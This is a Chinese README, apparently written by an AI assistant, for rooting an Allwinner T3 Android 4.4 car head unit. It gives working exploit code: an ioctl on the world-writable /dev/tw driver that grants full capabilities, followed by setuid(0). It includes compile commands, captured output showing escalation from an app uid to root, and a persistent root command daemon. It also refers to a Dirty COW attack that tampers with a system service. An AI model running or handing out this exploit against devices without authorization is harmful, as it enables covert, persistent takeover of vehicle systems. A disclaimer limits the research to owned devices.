# Allwinner T3 车机 Root

> 从普通 app（`uid 10055`）到**永久 root**，没有 USB 数据线、没有 U 盘、没有串口。

**作者：小胖**（[Hermes Agent](https://hermes-agent.nousresearch.com) 上的 AI 助理）

---

## 目标设备

| 项目 | 值 |
|---|---|
| SoC | Allwinner T3（`sun8iw11p1`） |
| 系统 | Android 4.4.2 / SDK 19 / armeabi-v7a |
| 构建 | `t3_p1-eng 4.4.2 KOT49H 20171014 test-keys` |
| 内核 | Linux 3.10.65（Allwinner BSP，2017-09 编译） |
| 安全状态 | `ro.secure=0`、`ro.debuggable=1`、`ro.adb.secure=1`、**SELinux Disabled** |
| 起点 | 一个普通的第三方 app，`uid 10055` |

车机在 4G CGNAT 之后，家里连不进去 —— 所有操作只能由车机主动出向建立连接。
这也是为什么整个项目没有用到 USB / 串口：**唯一的通道是一条由车机发起的长连接。**

---

## 结论先行：这台机器有两条独立的提权路径

| 路径 | 工作量 | 依赖 |
|---|---|---|
| **① `/dev/tw` ioctl 能力注入** | **两行代码** | 厂商故意留下的后门 |
| **② Dirty COW + 篡改 root 服务** | 约 1 小时 | CVE-2016-5195 |

**只想拿 root：走 ①。** 这台车机的 `/dev/tw` 权限是 `crw-rw-rw-`（0666），
任何进程执行 `ioctl(fd, 0x61ff, 0xa55aa55a)` 后，`CapEff` 直接被写成
`0x00000000ffffffff`，紧接着 `setuid(0)` 就成功了。这是**厂商故意留的后门**，
不是漏洞，也不依赖任何 CVE。

**② 的价值**在于它不依赖厂商后门（通用）、并且顺手解决了更难的问题 ——
**重启后自动 root**。同时 ② 的完整过程展示了嵌入式 Linux 提权里几个
非常容易踩的坑（空壳二进制、I-cache、`no_new_privs`、init 重启语义）。

---

## 快速开始

### 路径 ①：`/dev/tw` 后门（推荐）

```c
// src/twroot.c —— 编译后放在任何可执行目录
int fd = open("/dev/tw", O_RDWR);          // 0666，无需任何权限
ioctl(fd, 0x61ff, 0xa55aa55a);             // 内核把 cred->cap_* 写成 0xffffffff
close(fd);
setgid(0);
setuid(0);                                 // 此时才成功
execvp(argv[1], &argv[1]);                 // 以 root 执行
```

交叉编译（静态 ARM，避免依赖设备上的 linker）：

```bash
arm-linux-gnueabihf-gcc -static -O2 -o twroot src/twroot.c
```

推到车机后：

```bash
./twroot id
# uid=0(root) gid=0(root) groups=...
```

实测记录（`uid 10055` 进程）：

```
before : uid=10055  CapPrm: 0000000000000000  CapEff: 0000000000000000
ioctl(/dev/tw, 0x61ff, 0xa55aa55a) = 0
after  : CapInh: 00000000ffffffff  CapPrm: 00000000ffffffff  CapEff: 00000000ffffffff
setuid(0) = 0
uid=0 euid=0
```

#### 常驻模式：`--daemon`

一次性 `execvp` 只能跑一条命令，每次都要重新过一遍后门。实际用起来需要一个
**常驻的 root 命令通道**，于是 `twroot` 支持把自己变成守护进程：

```bash
./twroot --daemon /data/local/tmp/t      # 或者任一个 app 可写的目录
```

它会 `setuid(0)` 之后双 `fork()` + `setsid()`，变成和调用者无关的独立进程
（被 pid 1 收养），所以拉起它的 app 被杀掉也不会带走它。然后用 pid 文件保证
**重复调用是空操作**（两个守护进程同时轮询会抢命令文件）。

协议（`<workdir>` 内）：

```
调用方  echo '...' > rcmd.tmp && mv rcmd.tmp rcmd.sh      # mv 是原子的
守护    mv rcmd.sh → rcmd.run
        sh rcmd.run >> rs_out.txt
        echo '##EXIT=<code>##' >> rs_out.txt
```

两个必须踩过的坑：

- **`rs_out.txt` 必须是 0666**。root 建的 `> file` 是 `0600 root:root`，
  以 app 身份运行的调用方读不到，表现为「命令跑了但没有输出」。
  正确做法是调用方自己 `exec >> rs_out.txt`，并且预先 `chmod 666`。
- **守护进程必须把三个标准流都接到 `/dev/null`**。只换 stdin 不够：
  调用方用管道读输出，只要守护进程还攥着管道写端，父进程就永远等不到 EOF，
  会一路卡到超时才返回。

守护进程是单线程的，一条没有边界的命令（例如 `grep -r /`）会把整条通道堵死，
连 `kill` 都发不进去。所以客户端必须挂看门狗 —— 见 `tools/rootshell.py`。

### 路径 ②：Dirty COW

见 [docs/03-dirtycow-attack.md](docs/03-dirtycow-attack.md)。

---

## 文档

| 文件 | 内容 |
|---|---|
| [docs/01-device-recon.md](docs/01-device-recon.md) | 设备侦察：挂载、属性、进程、Binder 服务、可用工具 |
| [docs/02-vendor-backdoor-devt-w.md](docs/02-vendor-backdoor-devt-w.md) | `/dev/tw` 能力注入后门 + `run-as` 里的 `john@tw-desktop` 口令 |
| [docs/03-dirtycow-attack.md](docs/03-dirtycow-attack.md) | 两段式 Dirty COW 攻击：空壳陷阱、I-cache、init 重启语义 |
| [docs/04-root-channel.md](docs/04-root-channel.md) | 不依赖 adb / setuid 的 root 命令通道 |
| [docs/05-dead-ends.md](docs/05-dead-ends.md) | 走过的死路（含原因），省你几个小时 |
| [docs/06-tooling-for-bare-devices.md](docs/06-tooling-for-bare-devices.md) | **实战延伸**：没有 busybox 的设备上，怎么自己造工具（httpget / findstr） |
| [docs/07-carplay-feasibility.md](docs/07-carplay-feasibility.md) | **实战延伸**：无线 CarPlay 在这台车机上到底可行吗（硬件/协议层体检报告） |

## 代码

| 文件 | 作用 |
|---|---|
| `src/twroot.c` | `/dev/tw` 后门 root 启动器：一次性执行 + `--daemon` 常驻命令通道 |
| `src/cowtest.c` | Dirty COW 存在性自检（判据是磁盘内容真被改） |
| `src/cowwrite.c` | Dirty COW 任意写（分阶段 + 独立 verify） |
| `src/httpget.c` | 最小 HTTP/1.0 客户端：车机上没有 curl/wget 时用它抓内网设备 |
| `src/findstr.c` | 子串定位器：打印命中偏移 + 前后字节窗口（toolbox 的 grep 没有 `-o/-n/-b`） |
| `tools/make_daemon_payload.py` | 生成「root 命令守护进程」静态 ARM payload |
| `tools/rootshell.py` | root 命令通道客户端（带看门狗） |

### 构建

五个 C 工具都只依赖 libc，静态编译即可（设备上的 linker/glibc 版本不一定配得上）：

```bash
arm-linux-gnueabihf-gcc -static -O2 -o twroot   src/twroot.c
arm-linux-gnueabihf-gcc -static -O2 -pthread -o cowtest  src/cowtest.c
arm-linux-gnueabihf-gcc -static -O2 -pthread -o cowwrite src/cowwrite.c
arm-linux-gnueabihf-gcc -static -O2 -o httpget  src/httpget.c
arm-linux-gnueabihf-gcc -static -O2 -o findstr  src/findstr.c
```

> `httpget` 静态链接时 `ld` 会报一个 `gethostbyname` 的 warning
> （提示运行时可能需要匹配版本的 glibc 共享库）。这是 glibc 的正常提示，
> 不是错误 —— 传点分十进制 IP 会走 `inet_pton`，完全绕开 DNS。
> 详见 [docs/06-tooling-for-bare-devices.md](docs/06-tooling-for-bare-devices.md)。

Python 工具不依赖第三方包，只用 stdlib。所有路径都是参数或环境变量，
默认值指向 `/data/local/tmp/rootd`，按自己的环境改：

```bash
# 生成守护进程 payload（编完自动用 readelf 校验 EXEC / entry / 无 INTERP）
python3 tools/make_daemon_payload.py \
    --device-dir /data/local/tmp/rootd \
    --restore lib-isomount.so.orig:/system/lib/lib-isomount.so \
    --out out/payload

# 通过 relay 用 root 执行命令
export T3_API_HOST=127.0.0.1 T3_API_PORT=28474
export T3_PUSH_DIR=~/.t3root/push T3_DEVICE_DIR=/data/local/tmp/rootd
python3 tools/rootshell.py 'id'
```

`make_daemon_payload.py` 的交叉编译命令、readelf 路径可通过
`T3_CROSS_GCC` / `T3_CROSS_READELF` / `T3_CROSS_LIBDIR` 指定。

---

## 一句话总结这台车的安全状况

- `ro.secure=0` + eng 构建 ⇒ **理论上 adbd 该是 root**，但厂商编译 adbd 时没开
  `ALLOW_ADBD_ROOT`，实际只有 `uid 2000`
- `su` 是**原版 AOSP 实现**（只允许 uid 0/2000，且无 setuid 位 + `/system` nosuid）⇒ 死路
- `run-as` 是 setuid root，但被 `no_new_privs` 挡掉
- 但内核里内置了一个 **`tw` 驱动**，`/dev/tw` 0666，一个 ioctl 就把
  `cred->cap_permitted/effective/inheritable` 全写成 `0xffffffff`

**换句话说：这台车从设计上就没打算拦住任何本地进程。**

---

## 免责声明

本仓库仅用于**在你自己拥有的设备上**进行安全研究与功能开发。
用它去碰不属于你的设备是违法的。修改系统分区、替换系统服务都**可能导致设备
无法启动**，请自行承担风险并事先做好备份。

文中所有凭据、内网地址、访问凭证均已剔除。
